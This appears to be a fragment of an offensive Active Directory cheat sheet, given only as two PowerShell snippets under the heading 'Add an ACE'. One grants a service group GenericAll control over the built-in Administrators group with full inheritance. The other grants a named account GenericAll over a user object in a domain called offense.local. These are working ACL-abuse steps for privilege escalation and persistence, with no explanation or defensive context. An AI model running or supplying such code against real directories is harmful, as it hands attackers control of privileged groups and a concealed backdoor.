\section{Add an ACE}


\begin{verbatim}
$sid = (get-adGroup Svc_Admins).SID
$target_dn=(Get-ADGroup 'Administrators').DistinguishedName
$ADObject = [ADSI]("LDAP://$target_dn")
$sidr = [System.Security.Principal.IdentityReference] $sid
$adRights = [System.DirectoryServices.ActiveDirectoryRights] "GenericAll"
$type = [System.Security.AccessControl.AccessControlType] "Allow"
$inherit = [System.DirectoryServices.ActiveDirectorySecurityInheritance] "All"
$ace = new-object System.DirectoryServices.ActiveDirectoryAccessRule $sidr,$adRights,$type,$inherit
$ADObject.psbase.ObjectSecurity.AddAccessRule($ace)
$ADObject.psbase.commitchanges()
\end{verbatim}


\begin{verbatim}
    $ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
    $IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
    $ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
    $ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
    $ADSI.psbase.commitchanges()
\end{verbatim}
